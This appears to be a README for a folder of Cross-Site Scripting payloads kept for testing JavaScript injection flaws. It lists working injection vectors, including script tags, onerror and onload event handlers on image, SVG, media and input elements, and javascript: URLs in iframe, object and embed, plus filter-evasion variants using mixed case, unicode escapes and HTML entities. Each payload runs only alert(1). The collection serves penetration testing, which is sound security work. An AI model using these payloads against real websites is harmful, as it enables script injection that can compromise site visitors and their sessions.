XSS Payloads

Cross-Site Scripting payload collection for testing.

Folder Contents

This folder contains Cross-Site Scripting (XSS) payloads for testing JavaScript injection vulnerabilities.

Basic XSS Payloads

Type Payload
Basic Script <script>alert(1)</script>
Image Error <img src=x onerror=alert(1)>
SVG Onload <svg onload=alert(1)>
Body Onload <body onload=alert(1)>
Input Autofocus <input autofocus onfocus=alert(1)>
Video Source <video src=x onerror=alert(1)>
Audio Source <audio src=x onerror=alert(1)>
IFrame <iframe src=javascript:alert(1)>
Object Data <object data=javascript:alert(1)>
Embed Src <embed src=javascript:alert(1)>

Technique Payload

Uppercase <ScRiPt>alert(1)</ScRiPt>

Unicode <img src=x onerror=alert\u00281\u0029>

HTML Entities &lt;script&gt;alert(1)&lt;/script&gt;
